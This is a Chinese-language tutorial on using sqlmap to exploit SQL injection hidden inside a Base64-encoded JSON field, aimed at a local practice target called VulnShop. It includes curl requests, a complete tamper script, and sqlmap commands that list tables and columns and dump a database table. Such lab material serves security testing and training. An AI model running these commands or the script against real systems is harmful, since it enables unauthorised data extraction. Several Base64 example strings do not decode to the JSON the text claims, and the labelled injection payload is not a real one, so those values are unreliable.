# 嵌套加密参数 SQL 注入测试指南

本文档介绍如何使用 SQLMap Web UI 测试嵌套加密参数的 SQL 注入漏洞。

## 场景说明

某些 API 接口使用嵌套加密参数结构：
- 外层是标准 JSON 格式
- 其中某个字段（如 `data`）包含 Base64 编码的数据
- Base64 解码后是另一个 JSON，包含实际的业务参数
- 内层参数存在 SQL 注入漏洞

### 示例请求结构

```json
{
    "req_id": "123456",
    "data": "eyJjb3Vwb25fY29kZSI6ICJTQVZFMTAIFQ=="
}
```

`data` 字段 Base64 解码后：
```json
{"coupon_code": "SAVE10"}
```

注入点在 `coupon_code` 字段。

## VulnShop 靶场测试接口

靶场提供了以下测试接口：

| 接口 | 注入类型 | 说明 |
|------|----------|------|
| `POST /api/coupon/query` | 基于错误的注入 | 查询优惠券，返回错误信息 |
| `POST /api/coupon/search` | 布尔盲注 | 优惠券搜索 |
| `POST /api/coupon/by-category` | 时间盲注 | 按分类查询优惠券 |
| `POST /api/coupon/debug/decode` | 调试 | 解码 data 字段 |
| `POST /api/coupon/debug/encode` | 调试 | 编码 data 字段 |

## 手动测试方法

### 1. 使用调试接口准备 payload

```bash
# 编码 payload
curl -X POST http://127.0.0.1:9527/api/coupon/debug/encode \
  -H "Content-Type: application/json" \
  -d '{"data":{"coupon_code":"SAVE10"}}'

# 响应：{"success": true, "encoded": "eyJjb3Vwb25fY29kZSI6ICJTQVZFMTAIFQ=="}
```

### 2. 发送注入请求

```bash
# 正常请求
curl -X POST http://127.0.0.1:9527/api/coupon/query \
  -H "Content-Type: application/json" \
  -d '{"req_id":"1","data":"eyJjb3Vwb25fY29kZSI6ICJTQVZFMTAIFQ=="}'

# SQL 注入（Base64 编码的 payload）
curl -X POST http://127.0.0.1:9527/api/coupon/query \
  -H "Content-Type: application/json" \
  -d '{"req_id":"1","data":"eyJjb3Vwb25fY29kZSI6ICJTQVZFMTANIFQ=="}'
```

## SQLMap 自动化测试

### 使用 Tamper 脚本

使用本目录下的 `tamper_script.py`（放在 SQLMap 的 tamper 目录或使用完整路径）：

```python
#!/usr/bin/env python
import base64
import json
from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING

__priority__ = PRIORITY.NORMAL

INNER_PARAM = "coupon_code"
INNER_DATA_TEMPLATE = {}

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    将 payload 包装为 Base64 编码的嵌套 JSON
    """
    if not payload:
        return payload

    try:
        inner_data = INNER_DATA_TEMPLATE.copy()
        inner_data[INNER_PARAM] = payload

        inner_json = json.dumps(inner_data, ensure_ascii=False)
        encoded = base64.b64encode(inner_json.encode(UNICODE_ENCODING)).decode(UNICODE_ENCODING)

        return encoded
    except:
        return payload
```

### 运行 SQLMap

```bash
python sqlmap.py -u "http://127.0.0.1:9527/api/coupon/query" \
  --data='{"req_id":"1","data":"test"}' \
  --tamper=tamper_script \
  -p data \
  --batch
```

### 提取数据

```bash
# 获取表名
python sqlmap.py -u "http://127.0.0.1:9527/api/coupon/query" \
  --data='{"req_id":"1","data":"test"}' \
  --tamper=tamper_script -p data --batch --tables

# 获取列名
python sqlmap.py -u "http://127.0.0.1:9527/api/coupon/query" \
  --data='{"req_id":"1","data":"test"}' \
  --tamper=tamper_script -p data --batch --columns -T coupons

# 导出数据
python sqlmap.py -u "http://127.0.0.1:9527/api/coupon/query" \
  --data='{"req_id":"1","data":"test"}' \
  --tamper=tamper_script -p data --batch --dump -T coupons
```

### 使用 Preprocess 脚本（推荐复杂场景）

当需要修改整个请求（包括 headers、多字段处理、响应解码等）时，使用 preprocess 脚本更合适。

**工作原理**：SQLMap 将其 payload 作为纯字符串注入 `data` 字段，preprocess 函数在发送前对该字段值进行 Base64 编码；postprocess 函数在收到响应后对 `data` 字段进行 Base64 解码，让 SQLMap 能够读取明文内容。

#### Preprocess vs Tamper 的区别

| 特性 | Tamper 脚本 | Preprocess 脚本 |
|------|-------------|------------------|
| 作用范围 | 只修改注入参数值 | 修改整个 HTTP 请求 |
| 调用时机 | SQLMap 生成 payload 后 | 请求发送前 |
| 功能 | 编码/加密 payload | 修改 headers、body、处理响应等 |
| 适用场景 | 简单的参数转换 | 复杂的请求重构、响应处理 |

#### Preprocess 脚本使用

```bash
python sqlmap.py -u "http://127.0.0.1:9527/api/coupon/query" \
  --data='{"req_id":"1","data":"{\"coupon_code\":\"SAVE10\"}"}' \
  --preprocess=preprocess_script.py \
  -p data \
  --batch
```

#### Preprocess 脚本优势

1. **处理复杂请求结构**：可以同时修改多个字段
2. **响应解码**：在 `postprocess` 函数中解码响应，帮助 SQLMap 分析
3. **动态数据**：可以基于时间戳、token 等动态生成数据
4. **更灵活**：可以修改 headers、cookies 等

#### 何时使用 Preprocess

- 请求需要动态签名
- 响应也是加密的，需要解码
- 需要修改多个相关字段
- 需要添加/修改 headers

## 使用 SQLMap Web UI

### 方法一：直接发送请求

1. 在 SQLMap Web UI 中创建新任务
2. 使用 "HTTP 请求文件" 功能
3. 手动构造请求：

```
POST /api/coupon/query HTTP/1.1
Host: 127.0.0.1:9527
Content-Type: application/json

{"req_id":"1","data":"eyJjb3Vwb25fY29kZSI6ICJTQVZFMTAIFQ=="}
```

4. 在 "高级配置" 中添加 tamper 脚本路径

### 方法二：使用 Burp 插件

1. 在 Burp Suite 中拦截请求
2. 发送到 SQLMap Web UI 插件
3. 配置扫描参数时使用 tamper 脚本

## 注意事项

1. **严禁修改 `third_lib/sqlmap` 目录**：这是 SQLMap 开源库的 git 子模块，不要直接修改

2. **脚本位置**：
   - **Tamper 脚本**：
     - 临时使用：放在 SQLMap 安装目录的 `tamper/` 文件夹
     - 项目维护：放在项目自己的目录，如 `src/backEnd/tampers/`
   - **Preprocess 脚本**：
     - 临时使用：放在 SQLMap 安装目录的 `preprocess/` 文件夹
     - 项目维护：放在项目自己的目录，如 `src/backEnd/preprocess/`
   - **使用完整路径**：`--tamper=/absolute/path/to/script.py` 或 `--preprocess=/absolute/path/to/script.py`

3. **响应处理**：
   - 靶场的响应 `data` 字段也是 Base64 编码的
   - SQLMap 可能无法自动解析响应内容
   - 建议结合手动验证使用

4. **编码问题**：
   - 确保 payload 使用 UTF-8 编码
   - Base64 编码时注意 URL 安全字符

5. **调试技巧**：
   - 使用 `--proxy` 参数配合 Burp 查看实际请求
   - 使用 `-v 3` 或更高 verbose 级别查看详细信息

## 实际应用场景

这种场景常见于：
- 前端加密传输敏感参数
- API 网关统一加密处理
- 遗留系统的参数封装

测试时需要：
1. 了解加密/编码算法
2. 确定注入点位置
3. 编写对应的 tamper 脚本
4. 验证响应解析逻辑

## 相关文档

- [SQLMap Tamper 脚本开发](https://github.com/sqlmapproject/sqlmap/wiki/FAQ#how-can-i-write-my-own-tamper-script)
- [SQLMap 预处理脚本](https://github.com/sqlmapproject/sqlmap/wiki/Usage#preprocess-request)
- [项目 USAGE_GUIDE.md](../USAGE_GUIDE.md)
